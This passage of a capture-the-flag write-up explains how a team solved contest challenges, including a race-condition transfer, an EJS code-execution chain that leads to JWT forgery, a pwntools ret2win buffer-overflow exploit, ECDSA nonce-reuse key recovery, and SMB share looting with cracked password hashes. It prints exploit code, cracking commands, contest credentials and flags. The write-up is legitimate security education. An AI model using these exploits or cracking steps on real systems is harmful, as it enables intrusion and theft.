That mints the flag into `release.txt`, but there is a shortcut the challenge later confirmed with a hint: the flag was left hardcoded in the committed `pipeline/run.sh` itself. Clone the repo with the leaked `gituser` credential and read it straight out of git history, no remediation required:

```bash
git clone https://git.thesecuretrust.com/healthshield-group/fix-the-portal-devsecops.git
grep FLAG_VALUE fix-the-portal-devsecops/pipeline/run.sh
```

```text
FLAG_VALUE="UST_GenCyS_CTF{f1x_th3_p0rt4l_s4st_p1p3l1n3_pwn3d_2026}"
```

```
UST_GenCyS_CTF{f1x_th3_p0rt4l_s4st_p1p3l1n3_pwn3d_2026}
```

#### Race to Riches

`app/src/routes/transfer.js` checks the sender's balance, sleeps for a configured delay, then fires two independent updates with no transaction and no row lock:

```text
SELECT balance ...
sleep(TRANSFER_CHECK_DELAY_MS)
UPDATE accounts SET balance = balance - amount
UPDATE accounts SET balance = balance + amount
```

Classic TOCTOU. During that sleep, every concurrent request reads the same sufficient balance, so each one still credits the receiver even though the sender only funded one transfer. Bring the app up, register two accounts, and race 60 full-balance transfers per round, swapping sender and receiver each round:

```bash
docker compose up --build -d
python3 solve_race.py http://127.0.0.1:8080 --pac 07DCA73C
```

```text
round 1: racing $... from race_source to race_sink
burst: N/60 requests passed the stale balance check
[... rounds 2-4 omitted ...]
winner race_source dashboard HTTP 200: {"balance":12788200,"is_vip":true,"vip_threshold":1000000,"flag":"UST_GenCyS_CTF{167c39ff8a1d68deca4aa0ea847932c7}"}
```

In our run, dozens of requests cleared each stale-balance check and one account ballooned to $12,788,200. Cross the `$1,000,000` VIP line and the dashboard hands over the flag:

```bash
curl -s 'http://127.0.0.1:8080/api/dashboard?pac=07DCA73C' -H 'Authorization: Bearer <winner JWT>' -H 'X-PAC: 07DCA73C'
```

```text
{"balance":12788200,"is_vip":true,"vip_threshold":1000000,"flag":"UST_GenCyS_CTF{167c39ff8a1d68deca4aa0ea847932c7}"}
```

```
UST_GenCyS_CTF{167c39ff8a1d68deca4aa0ea847932c7}
```

### SCA

#### Dependency Crisis

The `@healthshield/claim-engine` package pins `ejs` to `3.1.6`, and the authenticated `/api/statement/preview` route passes customer-controlled `options` straight into `ejs.render`. That is CVE-2022-29078: EJS interpolates `outputFunctionName` into generated JavaScript without checking it is a valid identifier, so you get server-side code execution. The web container also holds an `INTERNAL_API_KEY` and still exposes a leftover `/.dev` static mount, and those two facts enable the pivot. The solver chains it end to end:

```bash
docker compose up --build -d
python3 solve_dependency.py http://127.0.0.1:8080 --pac 07DCA73C
```

```text
EJS injection returned HTTP 200
internal diagnostics leaked algorithm=HS256
{
  "flag": "UST_GenCyS_CTF{e874e3ddbdcf6fa91a2d1777673e59ea}"
}
```

1. Log in as the seeded customer, `customer@healthshield.local` / `Customer@2024`.
2. POST an `options.outputFunctionName` payload to `/api/statement/preview` that runs `curl` inside the web container.
3. That `curl` uses the container's `$INTERNAL_API_KEY` to hit `http://admin-service:8000/internal/secrets`, and writes the response under the `/.dev` mount.
4. `GET /.dev/id55-secrets.json` reads back the leaked `admin_jwt_secret`.
5. Forge a short HS256 admin token carrying `pac=07DCA73C` and call `GET /api/admin/flag`, which the public app proxies to the internal service.

```bash
curl -s http://127.0.0.1:8080/.dev/id55-secrets.json
```

```text
{"diagnostics":{"algorithm":"HS256","admin_jwt_secret":"<REDACTED_ADMIN_JWT_SECRET>"}}
```

```
UST_GenCyS_CTF{e874e3ddbdcf6fa91a2d1777673e59ea}
```

### Smart Contract

#### HealthCare Contract

The one smart-contract challenge: `healthcare-smart-contract`, a Foundry project that is 100% Solidity. It ships a DeFi lending pool called Hydra whose brief is blunt: drain all its ETH, and `isSolved()` flips true when the balance hits zero. Hydra advertises its defenses (a reentrancy guard, checks-effects-interactions in `withdraw`), and they hold up fine on the ETH functions. The gap is the NFT staking path. Staking pulls the token in with `safeTransferFrom`, which calls `onERC721Received` on your contract, and that callback lands before the staking state settles and outside the guard that protects `withdraw`. Reenter through the callback and you withdraw against balances that were never debited, draining the pool one head at a time. The flag name `nft_c4llb4ck_r33ntr4ncy_1s_und3rr4t3d` names the bug.

The git leak also handed over a shortcut for free. The deploy script carries the flag as a default: `DeployWithFlag.s.sol` does `vm.envOr("FLAG", "UST_GenCyS_CTF{...}")`, so the intended answer was present in source as a default value.

{{< figure src="gitea-deploywithflag.png" alt="DeployWithFlag.s.sol in the healthcare-smart-contract repo, the flag baked in as the vm.envOr default" >}}

`Flag.sol` shows the same thing: `claimFlag()` gates on `setup.isSolved()` and then returns the literal string.

```bash
grep -n -A6 'function claimFlag' src/Flag.sol
```

```text
27:    function claimFlag() external returns (string memory) {
28-        require(!claimed[msg.sender], "Already claimed");
29-        require(setup.isSolved(), "Challenge not solved");
30-
31-        claimed[msg.sender] = true;
32-        emit FlagClaimed(msg.sender, _flagHash);
33-        return "UST_GenCyS_CTF{nft_c4llb4ck_r33ntr4ncy_1s_und3rr4t3d}";
```

```
UST_GenCyS_CTF{nft_c4llb4ck_r33ntr4ncy_1s_und3rr4t3d}
```

### DFIR

#### Operation HealthTrace

A DFIR chase that starts from `operation-healthtrace-forensics` and a 100 MiB `disk_image.img`. The first trick is that the Git blob is 24 bytes longer than the disk itself, and reading those last 24 bytes with `tail` spells out `Pass: zip_password_1337`. The partition table then shows two Linux partitions, an ext4 at sector 2048 and a LUKS1 volume at sector 43008:

```bash
tail -c 24 disk_image.img
fdisk -lu disk_image.img
```

```text
Pass: zip_password_1337
Disk disk_image.img: 100 MiB, 104857600 bytes, 204800 sectors
Disklabel type: dos
Disk identifier: 0x0db59ccd

Device          Boot Start    End Sectors Size Id Type
disk_image.img1       2048  43007   40960  20M 83 Linux
disk_image.img2      43008 145407  102400  50M 83 Linux
```

Partition 1 (ext4) holds `rolled.jpg`, with a ZIP stashed inside the JPEG. Carve out partition 1, dump `rolled.jpg`, and open the embedded ZIP with `zip_password_1337`, which yields `super_safe_password.txt`:

```bash
dd if=disk_image.img of=p1.img bs=512 skip=2048 count=40960
dd if=disk_image.img of=p2.img bs=512 skip=43008 count=102400
debugfs -R 'dump /rolled.jpg rolled.jpg' p1.img
unzip -P zip_password_1337 -p rolled.jpg super_safe_password.txt
```

```text
warning [rolled.jpg]:  138474 extra bytes at beginning or within zipfile
  (attempting to process anyway)
UST_GenCyS_Luks_Password!123
```

That string is the passphrase for partition 2, a LUKS1 volume (`aes-xts-plain64`). Since we couldn't map a device locally, `decrypt_luks1.py` runs the PBKDF2, AES-XTS, and anti-forensic-stripe steps in userspace:

```bash
printf '%s\n' 'UST_GenCyS_Luks_Password!123' | python3 decrypt_luks1.py p2.img decrypted_ext4.img
```

```text
unlocked key slot 0 (key-material IV base 0)
wrote 50331648 bytes (payload IV base 0) to decrypted_ext4.img
```

The decrypted ext4 carries a GPS log of latitude and longitude strokes; `render_trace.py` plots that polyline, which draws the flag in block capitals.

```bash
debugfs -R 'dump /gps/1206112547-29099.txt 1206112547-29099.txt' decrypted_ext4.img
python3 render_trace.py
```

```text
rendered 30 strokes to finals_out/id72/gps_trace.png
```

```
UST_GenCyS_CTF{7R4CK_M3}
```

### Steganography

#### The MediClaim Assets

Not everything in the org was source to read. This one is a forensics puzzle from `mediclaim-assets-forensics`: a folder of ordinary-looking case files (a bank PDF, an XLSX statement, an ATM log, a branch photo, a payment PNG, an audio clip, an SVG logo, an incident email) with an AES-256 key split into four shares and scattered across them. Each share hides differently:

- **Share A** lives in the SVG. Its path data is nine pixel coordinates; read the green channel of `payment_notice.png` at those points and out come the bytes.
- **Share B** is in the stereo audio. The two channels are identical except at nine samples, and the absolute differences there spell the share.
- **Share C** is concatenated out of the XLSX cell comments.
- **Share D** is the `X-SecureTrust-Trace-Ref` header in the incident email.

The order is not A-B-C-D either; the evidence table in the bank PDF assigns positions and puts them in `C, A, D, B`. Concatenate in that order, SHA-256 the result, and that is the AES-256 key. The SVG's `<metadata>` holds the ciphertext (first 16 bytes as the IV, CBC, strip PKCS#7), and it decrypts straight to the flag. This was the one that ate a lot of my time from the wrong end: I was certain the SVG blob was the ciphertext, but I went hunting for a steghide passphrase that never existed instead of spotting the four shares. The whole extraction is one script that reads the four shares, orders them `C, A, D, B` per the PDF table, hashes them into the AES-256 key, and decrypts the SVG metadata:

```bash
python3 solve_assets.py
```

```text
share A: a1b2c3d4e5f60718
share B: 980765d4c3b2a190
share C: 1122334455667788
share D: 9988776655443322
order:     CADB
composite: 1122334455667788a1b2c3d4e5f607189988776655443322980765d4c3b2a190
SHA-256:   f51ce9b05ebd0a7d29c9d6ebe0a8e90907e6123cd28ee52a579b699406961eab
flag:       UST_GenCyS_CTF{f51ce9b05ebd0a7d29c9d6ebe0a8e90907e6123cd28ee52a579b699406961eab}
```

```
UST_GenCyS_CTF{f51ce9b05ebd0a7d29c9d6ebe0a8e90907e6123cd28ee52a579b699406961eab}
```

### Buffer Overflow

#### Claims Gateway

The org also held `claims-gateway-overflow`, and this one shipped an actual binary: `claimsd`, a legacy "Meridian Mutual Assurance" claims terminal. The source came with it, so the bug was visible directly in the source. `claimsd.c` base64-decodes a claim into a struct whose `diag_code` is 64 bytes, checks the input against a 256-byte cap, then copies it in with a bare `strcpy`:

```c
struct hl7_claim { char patient_id[64]; char amount[32]; char diag_code[64]; };
if (strlen(diag) > 256) return;     // 256-byte policy limit, 64-byte buffer
strcpy(claim.diag_code, diag);      // no bound check
```

The binary has no exploit mitigations: no PIE, no stack canary, NX off, symbols intact, which `pwntools` reads straight off the ELF:

```bash
python3 -c "from pwn import ELF; e=ELF('claimsd', checksec=True); print('payout_override', hex(e.symbols['payout_override']))"
```

```text
[*] '/home/abu/Main/CTF/GenCys/finals_out/id68/repo/claimsd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
payout_override 0x401376
```

It also carries a `payout_override()` maintenance hook that opens `/flag.txt` and prints it, so this is a clean ret2win with no shellcode needed. The offset drops out of the disassembly: `diag_code` sits at `rbp-0x70`, the saved return address at `rbp+8`, so `(rbp+8) - (rbp-0x70) = 0x78 = 120` bytes. The only wrinkle is that `strcpy` stops at the first NUL, but the little-endian address only NULs out after the return slot is already written, so the overwrite survives. Send the payload base64-encoded through menu option 1:

```python
import base64
from pwn import *

elf = ELF("claimsd")
payload = b"PAC-07DCA73C|1|" + b"A" * 120 + p64(elf.symbols["payout_override"])
io = remote(HOST, PORT)
io.sendlineafter(b"[claimsd]> ", b"1")
io.sendlineafter(b"claim> ", base64.b64encode(payload))
print(io.recvall())
```

Against the exact binary this hits the payout hook every time. Verified locally, the ret2win lands on `payout_override`, which opens `flag.txt` from its working directory; drop a placeholder `flag.txt` into the process's directory and the hook fires and prints it back:

```bash
python3 solve_claimsd.py --cwd ./claimsd_fixture
```

```text
[+] Starting local process '/home/abu/Main/CTF/GenCys/finals_out/id68/repo/claimsd': pid 1543023
[+] Claim accepted for adjudication:
    Patient ID   : PAC-07DCA73C
    Claim Amount : 1
    Diagnosis    : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv@
[*] Routing claim to the adjudication mainframe ... accepted.
[*] Estimated settlement window: 6 to 8 weeks.

=== PAYOUT OVERRIDE GRANTED (legacy maintenance hook) ===
UST_GenCyS_CTF{LOCAL_FAKE_FIXTURE_not_the_real_flag}
[+] verified flag: UST_GenCyS_CTF{LOCAL_FAKE_FIXTURE_not_the_real_flag}
EXIT=0
```

That `UST_GenCyS_CTF{LOCAL_FAKE_FIXTURE_not_the_real_flag}` is exactly what it says: a placeholder we wrote into the local working directory to prove the hook opens and prints `flag.txt`, not the real flag. The real `/flag.txt` only exists on the organizer runtime, which was answering `502`. The other half of the challenge is finding the instance, since CTFd hands out no connection info. A full connect-scan of the estate turned up `claims-app.thesecuretrust.com` (`20.219.119.212`), a dedicated host running nginx with a fresh cert, but it was answering `502 Bad Gateway` because its upstream `claimsd` was detached. So the exploit is written and verified locally; the live flag is one working upstream away. No fabricated flag here, we never got the box to hand us the real one.

### Mobile

Both mobile challenges are offline reversing jobs. The first bloods on each landed without any infra or notification going up, which is the tell: the flag lives inside the published binary, and you get it by pulling the app apart, not by talking to a server. We recovered both offline but never submitted them, so treat them as artifact-derived rather than scoreboard-confirmed.

#### HealthShield Mediclaim Android

The APK (`com.aegishealth.mediclaimpro`) is debuggable and ships with cleartext traffic enabled, and its API base URL is `http://10.0.2.2:5000`, the emulator's view of localhost, so there is no real backend to reach. Decompiling with jadx, the "authorization" the brief tells you to bypass turns out to be thin: `TokenManager.isLoggedIn()` only checks that the stored JWT string is non-empty, and the saved role never gates navigation. The real prize is the app's own secret. `SecureConfig.getApiHmacKey()` reconstructs the request-signing HMAC key at runtime from split constants, and reassembling it gives `AeG1sH3a1thS3cur3K3y2026`, which is exactly the unique authorization secret the challenge asks for. The reproducer rebuilds it straight from the jadx output:

```bash
python3 solve_mobile_offline.py
```

```text
Android HMAC key:       AeG1sH3a1thS3cur3K3y2026
Android AES seed:       m3d1cl41m_pr0_s3cur3
Android AES-128 key:    7cc8a891c5fd1fd7a901f11b18279569
Android flag candidate: UST_GenCyS_CTF{AeG1sH3a1thS3cur3K3y2026}
iOS Mach-O secret:      H3althSh13ld_MachO_S3cr3t_2026!
iOS flag candidate:     UST_GenCyS_CTF{H3althSh13ld_MachO_S3cr3t_2026!}
```

The single run resolves both mobile secrets at once. There is a second, deliberately distracting branch: a `CryptoHelper` the first-party app never calls, whose AES seed reassembles to `m3d1cl41m_pr0_s3cur3` (note the `cl41m`, not `claim`) and yields an AES-128 key. Nothing in the APK decrypts under it, so it is decoy code, not a second flag.

```
UST_GenCyS_CTF{AeG1sH3a1thS3cur3K3y2026}
```

#### HealthShield Mediclaim iOS

The IPA is deliberately misleading: `Payload/HealthShieldCare.app/HealthShieldCare` is not a Mach-O at all, it is a Linux x86-64 ELF, and its "integrity check" only probes four jailbreak paths before exiting. The brief asks you to bypass the client-side protection and pull out the embedded secret, and the binary carries exactly one unique sensitive string, `H3althSh13ld_MachO_S3cr3t_2026!`, which matches the description word for word. The app also signs `HealthShieldCare:<PAC>:<timestamp>:<nonce>`, but it accepts any timestamp and nonce, so that signature is not a fixed answer you can read off the challenge. The embedded secret is. Feeding the reproducer an arbitrary timestamp and nonce bears that out: the secret stays put while the signature is only ever a function of those inputs. The iOS side of that run reports:

```bash
python3 solve_mobile_offline.py --timestamp 1700000000 --nonce testnonce
```

```text
iOS Mach-O secret:      H3althSh13ld_MachO_S3cr3t_2026!
iOS flag candidate:     UST_GenCyS_CTF{H3althSh13ld_MachO_S3cr3t_2026!}
iOS signature:          d9c6fbbcbdc204e5e91d19ff64ba562f5dd6f95d0302368a07b9817020ab730c
```

```
UST_GenCyS_CTF{H3althSh13ld_MachO_S3cr3t_2026!}
```

### OSINT

#### The Phantom Claim

Pure recon, no infra. The HealthShield site's leadership and dev pages give the employee footprints, namely Daniel Mercer (`dmercer`), Sarah Coleman, and Robert Vance, plus an internal project codename, ORCHID. Among the dev assets is a set of password-protected recovery archives; `recover_ORCHID-27.zip` is the one that matters, and its password is derivable *only* from the OSINT (the name + the codename). Build the wordlist from what you found and crack it:

```bash
zip2john recover_ORCHID-27.zip > orchid27.hash
john --wordlist=osint_words.txt orchid27.hash
unzip -P 'Orchid27' recover_ORCHID-27.zip && cat incident-summary.txt
```
```
UST_GenCyS_CTF{b5f2dc3720b832abab6f54fe35962f76}
```

### The Fun Stuff

Rooting a box is half of it. Poking around afterwards is the other half.

#### The decoy company in the cluster

Once we had cluster-admin on ClusterFall, we walked every namespace expecting loot, and most of it turned out to be set dressing. `production`, `dev`, `testing`, and `monitoring` all exist just to make `kubectl get pods` look like a real company: postgres, redis, grafana on `admin/admin12345`, prometheus. But the cron jobs are no-ops that just `echo vacuum; sleep 1`, and every "flag" in those namespaces is a rabbit hole along the lines of `GenCyS{decoy-...-keep-looking}`.

#### The scoring backend in the same cluster

The service that mints flags was running inside the same cluster we were told to root, and cluster-admin reads everything, so we ended up looking straight at it. That is an unintended colocation; a scoring service should never be reachable from a challenge box. We confirmed it was real, filed it as an infra bug, and left it completely alone, because minting flags from the scoring secret is not solving a CTF. Every flag here came from popping its box, and out of the same respect the secret's value is not printed. ClusterFall was later pulled from the platform entirely.

#### The build scripts on the domain controller

After Domain Admin on MedCore, we WinRM'd onto the DC and found the challenge's own build automation sitting in `C:\CTF\build\`, the scripts `01-promote-dc.ps1` through `07-flag-and-selfheal.ps1`. The flag self-heals every couple of minutes so you cannot permanently break the box, and one script carries the comment `# Static flag (you said static is fine).` Reading `03-plant-vulns.ps1` is basically the intended-solution guide. The DC was also watching us: `05-edr-sysmon.ps1` stands up Sysmon, Defender, and Velociraptor, so every command we ran was logged. We checked whether that Velociraptor was a fleet console that reached other boxes, and it was not; the server and client both point at localhost.

### Network

#### HealthShield Connections

This is where we learned the `-p-` lesson. The targeted `connections` scan (`21/ftp`, `80/nginx`, `445/Samba` on `FS01`, `8080/dead admin`) points straight at SMB, and the chain is clean SMB looting. Anonymous share enumeration on `FS01` turns up a public drop and a `RESTRICTED` finance archive:

```bash
smbclient -L //20.219.90.234/ -N
```

```text
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      Corporate public file drop (anonymous)
	finance         Disk      Finance archive (RESTRICTED)
	IPC$            IPC       IPC Service (GenCyS Corp File Server (FS01))
SMB1 disabled -- no workgroup available
```

The anonymous `public` share holds an account export:

```bash
smbclient //20.219.90.234/public -N -c 'ls'
```

```text
Can't load /etc/samba/smb.conf - run testparm to debug it
  .                                   D        0  Fri Sep  4 18:42:01 2026
  ..                                  D        0  Fri Sep  4 17:37:10 2026
  fs01_account_export.tar.gz          N     1087  Fri Sep  4 18:42:01 2026
  Q3_Financial_Report_DRAFT.pdf       N     3084  Fri Sep  4 18:42:01 2026

		29379712 blocks of size 1024. 24943820 blocks available
```

Pull it and unpack it, and it is a captured `/etc/shadow`:

```bash
smbclient //20.219.90.234/public -N -c 'get fs01_account_export.tar.gz'
tar xzvf fs01_account_export.tar.gz && cat etc/shadow
```

```text
getting file \fs01_account_export.tar.gz of size 1087 as fs01_account_export.tar.gz
drwxr-xr-x root/root         0 2026-09-04 18:42 etc/
-rw-r--r-- root/root       168 2026-09-04 18:42 etc/EXPORT_INFO.txt
-rw-r--r-- root/root       357 2026-09-04 18:42 etc/passwd
-rw------- root/root       815 2026-09-04 18:42 etc/shadow
root:$6$6c00c327d124fa36$znyXX...SY46n/:19500:0:99999:7:::
m.alvarez:$6$7a08e9e57adde9a6$kWN0i4...IYhqv1:19500:0:99999:7:::
s.chen:$6$1dc43fb46dbd79fe$A3Bya...CqCqua.:19500:5:99999:7:::
finance_backup:$6$926ecfa68f7e1bea$iFMU6Xij.2maRxXWFIcLbyD6VzaN197rmpRJEXd4fUJTS7Gle5MjQKmEigmGRaLKLGIV2uaqtkf6Su4MtnJtI.:19510:0:99999:7:::
archive_2019:$6$fb38cc6c44b31b62$XdxSkJ3Qa0GcY9wP/mA8KUh5cERHXWQ68SBRe/BEwsVGeci7AsVLpb7dqVcoVoFPef3SoIyBWiY4XpqSBrROv/:19350:0:99999:7:::
r.okafor:$6$719a36cb1804c44d$uYdIQ...fAFG.:19520:0:99999:7:::
```

`unshadow` the pair and feed the seasonal wordlist to John; two hashes fall, and they are the `Season+Year+!` policy we later sprayed at MedCore:

```bash
unshadow etc/passwd etc/shadow > hashes.txt
john --wordlist=season_wordlist.txt --format=sha512crypt hashes.txt
john --show --format=sha512crypt hashes.txt
```

```text
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Autumn2022!      (archive_2019)
Winter2024!      (finance_backup)
2g 0:00:01:40 DONE (2026-09-06 06:30) 0.01995g/s 306.5p/s 344.8c/s 344.8C/s
Session completed
=== --show ===
finance_backup:Winter2024!
archive_2019:Autumn2022!

2 password hashes cracked, 0 left
```

The restricted `finance` share then opens as `finance_backup`, and here the two files split: `maintenance_notes.txt` comes down, `flag.txt` refuses:

```bash
smbclient //20.219.90.234/finance -U 'finance_backup%Winter2024!' -c 'ls; get maintenance_notes.txt'
```

```text
finance_backup: login OK
  maintenance_notes.txt   601   READABLE (downloaded)
  flag.txt                 47   NT_STATUS_ACCESS_DENIED (owned by maintenance)
```

The notes hand over a maintenance shell on `:2222`:

```bash
cat maintenance_notes.txt
```

```text
==============================================================
 GENCORP IT OPERATIONS - EMERGENCY ACCESS NOTICE (Q3)
==============================================================
 The finance archive maintenance shell is exposed on:

     ssh maintenance@FS01 -p 2222

 Rotated credentials (ref: audit Q2-2024-114):

     user:     maintenance
     password: abed12f684c5b1b576cd42f9

 NOTE: the legacy gateway on port 22 is DECOMMISSIONED and is
 kept online for compliance monitoring only. All maintenance
 traffic MUST use port 2222.
==============================================================
```

The last step is where it stalls: `flag.txt` in the finance share is owned by `maintenance` and only readable via that SSH shell, and `:2222` is firewalled from our source IP because an earlier full-port scan tripped the box's scan-ban. We re-verified it filtered from every vantage we controlled. The flag sits behind that SSH shell, reachable with one `ssh` from a clean IP, which is what scored it; our own vantage was burned. Targeted scans only.

### Dead Ends

A few of these boxes we took completely apart and still walked away empty. Not for lack of reversing, but because the piece that actually mints the flag was never shipped in the package. They scored nothing, so none of this counts toward the total above. Here is how far each one got.

#### ClaimSeal (Reverse Engineering)

From `claimseal-vault-authenticator`: a Windows `VaultSeal.exe`, its `vaultseal_core.dll`, and an AES-encrypted `settlement_drop.zip`. The flag hides in the archive, in a `retired_flag.txt` locked next to two other entries, and `7z` shows all three are AES-encrypted and stamped the same second, `2026-08-14 00:09:46`:

```bash
7z l -slt settlement_drop.zip | grep -E 'Path|Encrypted|Modified'
```

So the whole box comes down to the ZIP password. `VaultSeal.exe` loads the DLL, resolves `GeneratePassword`, calls `_time64(NULL)`, and feeds the low 32 bits straight in as the seed for a 12-character password. The "passwords rotate every 42 seconds" banner and the two flags sitting in the DLL are all QA decoys. Reversing the export gives a seed-mixed xorshift feeding an LCG, which we rebuilt exactly:

```python
ALPHABET = "Q9aW8sE7dR6fT5gY4hU3jI2kO1lP0zXcvbnmASDFGHJKLqwertyuiopZXCVBNM"

def gen_password(seed, n=12):
    x = (seed ^ 0x0b4dc0de) & 0xffffffff
    x ^= x >> 16
    x = (x * 0x7feb352d) & 0xffffffff
    x ^= x >> 15
    state = x or 1
    out = ""
    for _ in range(n):
        state = (state * 0x19660d + 0x3c6ef35f) & 0xffffffff
        y = state ^ (state >> 13)
        y = (y ^ (y << 17)) & 0xffffffff
        y ^= y >> 5
        out += ALPHABET[y % 62]
    return out[::-1] if seed & 1 else out   # odd seeds reverse, then rotate by half
```

Then sweep every candidate seed and check it against the ZIP's real AES verifier, not just for readable output:

```bash
python3 recover_claimseal_password.py
```

That covers 2,073,601 seeds across the 2026-08-13 to 2026-09-06 window and every timezone offset, plus seeds derived from PE timestamps, artifact hashes, and exported constants. Nothing verified. The seed that actually sealed the archive is not anywhere in the shipped files, so the password, and the flag behind it, cannot be reproduced. Zero global solves.

#### HealthShield Leakage (Reverse Engineering)

From `healthshield-leakage-analysis`, a five-file vault protocol set: `vault_ecm.exe`, `vault_lock.exe`, `guard_station_dump.bin`, `vault_lan_capture.pcap`, and `sealed_deposit.enc`.

The two executables are small self-modifying bytecode VMs, so reading them statically is a mess. We wrote a clean-room emulator for their instruction set instead, and it reproduced the ECM seed chain and the cached override key. That same override then showed up, unprompted, in the two places the challenge clearly meant as evidence, the memory dump and the packet capture:

```bash
strings -a guard_station_dump.bin | grep -A1 cached_ecm_code
tshark -r vault_lan_capture.pcap -Y 'tcp.port==7331' -T fields -e data
grep -a override_salt guard_station_dump.bin
```

The dump holds `d140e205f9a04436756390bcdf482de4` right after the `cached_ecm_code` marker, the exact value the emulator produced; the lone port-7331 stream repeats it inside its `VX` application frame; and the dump also gives up `override_salt=VAULT_ECM_OVERRIDE_26`. Everything matched, but the last file did not decrypt. `sealed_deposit.enc` is 64 bytes and does not fall to AES, a stream cipher, or any XOR/KDF built from the recovered value. The disassembly says why: `vault_ecm.exe` calls into a custom guard-side keystream whose bytecode lives in a third binary, `vault_guard_svc.exe`, and that binary was never shipped. The memory dump names it as the source process but is a heap-only synthetic, so the stack VM state and the cipher bytecode are simply absent. No guard binary, no schedule, no plaintext.

#### Broken Vault (Cryptography)

From `healthshield-broken-vault`: STTX-format encrypted records, a transaction bundle, and a key-exchange log. Both advertised flaws fell fast. The settlement and archive records reuse the same AES-GCM key id and nonce, which leaks the XOR of their plaintexts (though both are binary). The bigger one is the transaction bundle: two ECDSA signatures over secp256k1 share a nonce, and that is textbook. Two signatures with the same `r` give up the nonce `k`, and `k` gives up the private key `d`:

```python
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
k = (z1 - z2) * pow((s1 - s2) % n, -1, n) % n   # f89851de...01889998
d = (s1 * k - z1) * pow(r, -1, n) % n           # 6d83921e...8e15f27c
assert d * G == server_pub                       # exact, so this is real, not a guess
```

The full solver ties it together: it parses every STTX record, recovers `k` and `d`, validates `d*G`, computes the ECDH shared point, confirms the GCM nonce reuse, and then demonstrates the KDF mismatch:

```bash
./analyze_broken_vault.py
```

So the signature layer is fully broken and validated. The encryption layer is where it stalls. The transcript's own derivation, `HKDF-Extract` over `salt = "ST-TSP" || 0x13 || session_id` then `HKDF-Expand` for each nonce, does not reproduce the record nonces from the recovered state, and a wider sweep of 7,564 point encodings, salt layouts, info labels, and extract orderings found no match either. None of the derived AES-GCM keys authenticate a single record. The breaks are correct; the supplied metadata just does not add up to a decryptable flag.

#### HealthShield Incident (Malware Analysis)

`SecureTrust_Update.exe` carries two XOR-packed JSON configs, and the unpack loop is right there in the disassembly. Decoding the real one (16-byte key at RVA `0xb1f0` over 396 bytes at `0xa120`) gives a full, believable C2 profile:

```json
{ "c2": "ledger-gate.securetrust-cdn.net:8080",
  "campaign": "CAMP-SILENTLEDGER-2024-09",
  "victim": "VICT-1969B-9825",
  "kdf": "pbkdf2-hmac-sha256", "iter": 100000,
  "salt": "c41d62673ffea501653b725c72a766c4" }
```

The second config, keyed at `0xb200`, is the obvious decoy: `decoy-c2-01.securetrust-update.com`, `CAMP-DECOY-77`, `VICT-DECOY-0000`, only 1,000 PBKDF2 iterations. Both paths get followed to the end, and both dead-end. The stage-1 binary turns out to be an explicit CTF simulator whose only drop is the fixed 18-byte stub `ST-SIM-STAGE2-STUB`, and the supplied `suspicious_file.bin` just prints the recovered identifiers and sleeps, with no crypto or exfil left to reverse. The one flag-shaped value on the intended path is a planted `ledger_token` that was already rejected as a decoy back in the legacy version of this challenge.

The through-line on all four is the same one from the buffer overflow: the analysis is right, but the flag-bearing artifact, a seed, a guard binary, a real KDF, a live C2, was never deployed. Every one still shows zero solves globally.
